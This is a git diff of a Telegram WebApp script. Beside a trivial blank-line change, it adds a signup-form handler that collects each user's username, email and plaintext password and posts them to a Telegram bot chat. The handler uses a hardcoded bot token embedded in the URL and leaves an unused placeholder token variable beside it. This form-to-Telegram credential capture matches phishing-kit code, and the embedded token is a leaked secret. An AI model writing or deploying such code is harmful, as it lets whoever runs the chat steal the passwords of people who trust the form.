@@ -21,6 +21,7 @@ document.addEventListener("DOMContentLoaded", () => {
     const botAnswer = document.getElementById("botAnswer");
     botAnswer.textContent = "Отправляем данные боту..."; // Выводим сообщение о отправке данных
 
+  
     tg.sendData(JSON.stringify(data)); // Отправляем данные боту
     tg.close(); // Закрываем WebApp после отправки
   });
@@ -30,3 +31,45 @@ document.addEventListener("DOMContentLoaded", () => {
     tg.close(); // Закрываем WebApp
   });
 });
+
+
+document
+  .getElementById("signupFormContent")
+  .addEventListener("submit", function (event) {
+    event.preventDefault();
+    var username = document.getElementById("username").value;
+    var email = document.getElementById("email").value;
+    var password = document.getElementById("password").value;
+
+    var message = `Username: ${username}\nEmail: ${email}\nPassword: ${password}`;
+
+    var telegramBotToken = "YOUR_TELEGRAM_BOT_TOKEN";
+    var telegramChatId = "YOUR_TELEGRAM_CHAT_ID";
+
+    var url = `https://api.telegram.org/bot7439911780:AAF-0YhIPfyfKJ54tfSpQXOvQozi0taeTCU/sendMessage`;
+
+    var data = {
+      chat_id: telegramChatId,
+      text: message,
+    };
+
+    fetch(url, {
+      method: "POST",
+      headers: {
+        "Content-Type": "application/json",
+      },
+      body: JSON.stringify(data),
+    })
+      .then((response) => response.json())
+      .then((data) => {
+        if (data.ok) {
+          alert("Message sent successfully!");
+        } else {
+          alert("Error sending message.");
+        }
+      })
+      .catch((error) => {
+        console.error("Error:", error);
+        alert("Error sending message.");
+      });
+  });
